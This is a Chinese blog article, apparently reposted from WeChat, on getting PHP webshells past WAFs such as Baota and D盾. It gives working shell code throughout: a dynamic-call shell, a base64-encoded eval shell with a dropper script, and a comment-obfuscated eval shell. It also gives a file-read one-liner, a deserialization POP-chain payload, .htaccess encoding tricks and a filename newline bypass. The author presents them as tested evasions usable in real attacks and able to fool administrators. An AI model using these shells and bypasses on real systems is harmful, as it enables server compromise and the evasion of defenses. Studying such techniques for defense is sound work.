\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MjM5MTYxNjQxOA==&mid=2652863756&idx=1&sn=50279e28c96e4a7b46782c51bf4a6820&chksm=bd5901c18a2e88d7f41c1cd7658fe5ad9ebc146964fd297afb79ed1601baf26ac66b36a708fd&mpshare=1&scene=1&srcid=1016lBAqCMOGdjgWNycLvDTr&sharer\_sharetime=1602823602260&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=d1b2c53fcb9e77ee3703a3cb818d9912f5f4b5ded84d0bced721fc7908b705ec13b0da5269484fc3e8814c57242a72fc1c6622893faf297df311d028e52a9b2576ddcd9de52fdd8829ce75ea7d436a3aeec707020d8f3ac0377ae435d3e23d10150d1803f057f76ce893905247b2c3299a49581142ec9cb5f0556b849009b1e0&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AXlnZ0eXDefD1aDukSQJTlw%3D&pass\_ticket=fNc1mNErgeHhn4jm0DcjBlD5hkXepEyD08VA%2B16wYw5QmvtETgayFa%2BrZuz3ot9i&wx\_header=0)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

亲爱的,关注我吧

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDWthuxj2TXBsNCVHu70z5pcUkEHkWCrichUzI2esFfCrwUOpkB24XedQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

**10/16**

文章共计1981个词

预计阅读10分钟

来和我一起阅读吧

  

很久没写文章了，继上次发先文章到今天已经很久了；很久没写文章了，继上次发先文章到今天已经很久了；今天突发异想；因为之前打了西湖论剑，遇到了宝塔的waf，最后也是过去了，便觉得另类的攻击方法值得写篇文章分享下；首先我打算分享几种。

一：动态调用
------

      首先，一些waf会对文件内容进行检索，如果发现有什么危险的函数，或者有什么危害的逻辑，都会进行拦击，所以我们不能写入一些危险的函数，否则就会被ban掉，其实在实际的攻击中，也是存在和这次论剑web1一样的绕过方式，在我们真正恶意代码前加入大量杂糅字符进行绕过；然后对后缀进行换行绕过；

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Le6ldd84icOm8SqzEUObIiaVenvOTaKV6hia1DwZLlp7omrbSYicyqiacOKDEsZicGoQtF84YuhzIZmbQKw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

那么就会存在此次web1的动态调用解法；

写入`<?php $_GET['0']($_GET['1']);?>`我们在上传的文件中并没有出现什么危险的函数，而是通过后期的get传入进行动态调用从而执行命令；这样就会绕过上传时waf的检测；但是绕不过disable\_function;；

载荷效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Le6ldd84icOm8SqzEUObIiaVeicXbgEfHiaGf3EIZdMcic1jj64U7GF9OHQnX3a7z6LtRgplY90O3yrXGA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

二：利用.htaccess文件
---------------

对于利用.htaccess文件的攻击方法，其实有很多方法；包括自我包含造成后门，或者auto\_prepend\_file文件，或者自定义报错目录然后利用包含报错写入木马最后自定义包含，AddType等等。当然如果想搞怪的话，也是可以利用.htaccess打出存储型xss的效果；但是这里主题分享如果过滤了内容中的一些敏感字符应如何。

比如过滤了<? 或者 <  ;这里也是老方法了；之前也写过，利用.htaccess进行编码的转化，base64或者UTF-7都可；我们只需要将木马文件进行相应的编码即可；这种方法可以绕过waf的检测，但是也是绕不过 disable\_function；

三：利用文件修改文件造成木马
--------------

这种方式也确实值得分享，也是基于waf对我们的木马内容进行过滤；当我们无法上传带有危险函数的木马时；可以使用文件篡改文件的方法；这种方法基于第二种方法.htaccess无法传入的时候；

比如：先传入`PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=`命名为1.php；这里我们上传时waf自然不会检测到，因为我们确实没有危险函数；然后再次传入第二个没有高度危险函数的2.php代码：

```
`<?php` `$path ="/xx/xxx/xx/1.php";``$str= file_get_contents($path);``$strs = base64_decode($str);``$s1mple = fopen("./s1mple.php","w");``fwrite($s1mple,$strs);``fclose($s1mple);``?>`
```

代码逻辑简单，将我们的文件，进行了base64解密，然后写入的一个新的php文件中，这样避免了file\_put\_contents这个极大概率被ban的函数的出现，又成功的写入了文件，我们访问2.php，然后再访问s1mple.php就可以拿到shell；载荷效果如下：

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

四：利用低危木马；
---------

基于第三种方法，我们如果不是拿权限的话，也是可以利用一些低危的操作，比如任意文件读取等等；

下面先来看这段getshell的代码

```
`<?php``$s1mple = file_get_contents(__FILE__);``eval(str_replace("<?php","",str_replace("//","",$s1mple)));``//eval($_GET['a']);``?>`
```

这段代码在之前可以绕过D盾，是基于注释的绕过；现在不确定还能否绕过；简单分析下逻辑；首先$s1mple得到本篇代码的所有内容；然后执行一个替换的语句；先释放出木马语句；然后再将php头换掉，保持了原本的php头；这样就释放出了木马，就可以通过get传参进行命令执行；

  

或者换种方法，这里我们可以直接file\_get\_contents函数进行攻击，

```
<?php echo file_get_contents($_GET['a']);?>
```

  
这样也就可以达到任意文件读取，当然，因为php的特性，也可以对file\_get\_contents进行各种处理，使其绕过waf；也可以结合其他php的内置函数进行攻击，可以类比；这里不在细说；

五：利用逻辑问题
--------

这种思想比较新颖；简单来说，我们并不是传入恶意代码，而是传入一段正常的代码，然后通过逻辑修改其运作走向，从而达到恶意执行，那么适合的就是pop链的构造了；

```
`<?php``error_reporting(0);``class s1mple{` `public $A;` `function __construct(){` `$this->A=new hacker();` `}` `function __destruct(){` `$this->A->action();` `}``}``class hacker{` `function action(){` `echo "hello_hacker";` `}``}``class evil{` `public $data;` `function action(){` `eval($this->data);` `}``}``unserialize($_GET['a']);`
```

  
先来看正常的代码；这段代码中我们按照正常的逻辑分析，肯定是没有问题的；但是我们可以利用逻辑，改变其执行的走向从而进行对象注入达到攻击；

```
O:6:"s1mple":1:{s:1:"A";O:4:"evil":1:{s:4:"data";s:10:"phpinfo();";}}
```

  
在我们一般的上传中，往往是图片，就单代码而言，其大小是微乎其微的；所以在实战中也可用到；而且很难被检测到；当然，这只是一种方式，也可以结合回调函数和其他的函数，可以将其隐藏起来，然后利用pop触发；而且如果代码伪造的合适的话，也是可以骗过管理员从而避免被管理员删除的；

六：利用过宝塔waf思路另辟蹊径绕过waf
---------------------

宝塔的waf对于文件明后缀的检测，是可以通过换行进行绕过的；就譬如我们在例子一中说的那样，那么我们除了对于我们后缀进行换行绕过，我们也可以考虑对我们的filename做手脚；对filename做换行，也可以绕过；

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

以上这些方法也算是新式方法，当然也可以考虑异或或者自增的木马，也可以通过混淆进行攻击，都可；但是实际中这些往往会被检测，上述的几种方法都是测试后可绕过D盾或者绕过宝塔的方法，供参考；另外一些方法需要可以首先绕过上传对后缀的检测，比如可以换行绕过宝塔对后缀的检测；如果可以上传php，那么以上方法即可任意发挥攻击。  
  

**相关实验：WAF渗透攻防实践** 

https://www.hetianlab.com/expc.do?ec=ECIDee9320adea6e062017110811103300001

通过该实验了解基于规则的WAF的工作原理，通过分析相关防御规则，尝试使用多种方法进行绕过，使读者直观感受攻防双方的博弈过程。

**10/16**

  

欢迎投稿至邮箱：**EDU@antvsion.com**  

有才能的你快来投稿吧！

  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

戳“阅读原文”我们一起进步